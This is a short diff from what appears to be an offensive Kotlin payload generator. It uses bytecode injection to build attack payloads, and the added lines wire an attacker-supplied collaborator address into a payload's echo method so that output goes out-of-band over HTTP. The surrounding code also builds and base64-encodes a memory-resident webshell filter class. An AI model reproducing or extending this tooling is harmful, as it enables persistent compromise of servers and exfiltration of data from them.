@@ -33,6 +33,10 @@ class PayloadGenerator {
                     $0.result = new String(output);
                 }""".trimIndent()
             )
+            if (Option.echo == "http") {
+                checkNotNull(Option.collabAddress)
+                ctClass.getDeclaredMethod("echo").insertBefore("{$0.collabAddress = \"${Option.collabAddress}\";}")
+            }
         } else if (mapping == "Mem") {
             val filterBytes = pool.getCtClass("payload.memshell.DynamicFilter").toBytecode()
             val b64Bytes = Base64.getEncoder().encode(filterBytes)
